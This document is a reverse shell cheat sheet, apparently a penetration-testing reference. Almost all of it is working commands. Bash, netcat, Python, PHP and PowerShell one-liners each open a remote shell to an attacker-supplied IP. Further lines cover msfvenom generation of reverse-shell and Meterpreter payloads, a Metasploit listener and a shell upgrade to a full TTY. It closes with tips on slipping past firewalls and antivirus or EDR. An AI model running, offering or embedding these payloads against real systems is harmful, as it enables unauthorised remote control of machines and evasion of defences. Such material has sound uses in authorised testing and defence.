# Reverse Shell Cheat Sheet

Start a listener first: `nc -lvnp 4444`

## Linux / Bash
```bash
bash -i >& /dev/tcp/<ip>/4444 0>&1
```

## Netcat variants
```bash
nc -e /bin/sh <ip> 4444                          # if nc has -e compiled in
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 4444 >/tmp/f   # no -e needed
```

## Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP
```php
php -r '$sock=fsockopen("<ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PowerShell (Windows)
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ip>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

## MSFVenom Payload Generation
```bash
# Windows exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/reverse_php LHOST=<ip> LPORT=4444 -f raw -o shell.php

# Staged Meterpreter (Windows)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o met.exe
```
Matching handler: `msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"`

## Upgrading a Dumb Shell to a Full TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z then on your attacker machine:
stty raw -echo; fg
# then in the shell:
reset
```

## Common Pitfalls
- Firewall may block outbound on common ports — try 443/80 first, they're rarely blocked outbound.
- AV/EDR will flag `msfvenom` default payloads almost instantly on modern endpoints — encoding alone (`-e`) rarely helps anymore; custom payloads or living-off-the-land binaries are far more reliable.